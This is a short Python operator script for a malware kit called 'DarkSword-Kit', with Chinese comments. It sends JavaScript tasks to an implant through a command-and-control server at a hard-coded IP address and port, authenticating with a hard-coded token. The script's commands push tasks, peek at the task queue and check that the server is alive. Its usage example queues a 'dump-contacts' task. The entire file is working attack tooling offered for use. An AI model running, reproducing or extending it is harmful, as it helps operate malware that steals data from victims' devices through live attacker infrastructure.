#!/usr/bin/env python3
"""ops.py — DarkSword-Kit 运维小工具
对已部署 C2（38.55.215.11:8642）执行:
    push <js表达式>      推送一条 JS 任务给 implant
    peek                 查看队列头（不取走）
    status               探活
用法:
    python3 ops.py push "(()=>({cmd:'dump-contacts'}))()"
"""
import json
import sys
import urllib.request

C2 = "http://38.55.215.11:8642"
TOKEN = "DSW-11fba53a2b10af78929089d2dd6d01b9"


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return
    cmd = sys.argv[1]
    if cmd == "status":
        try:
            r = urllib.request.urlopen(C2 + "/task", timeout=5)
            print("C2 alive, GET /task ->", r.status)
        except Exception as e:
            print("C2 unreachable:", e)
    elif cmd == "push" and len(sys.argv) >= 3:
        task = sys.argv[2]
        req = urllib.request.Request(
            C2 + "/task", data=task.encode(),
            headers={"X-Auth-Token": TOKEN,
                     "Content-Type": "text/javascript"})
        r = urllib.request.urlopen(req, timeout=5)
        print("pushed ->", r.status, r.read().decode())
    else:
        print(__doc__)


if __name__ == "__main__":
    main()
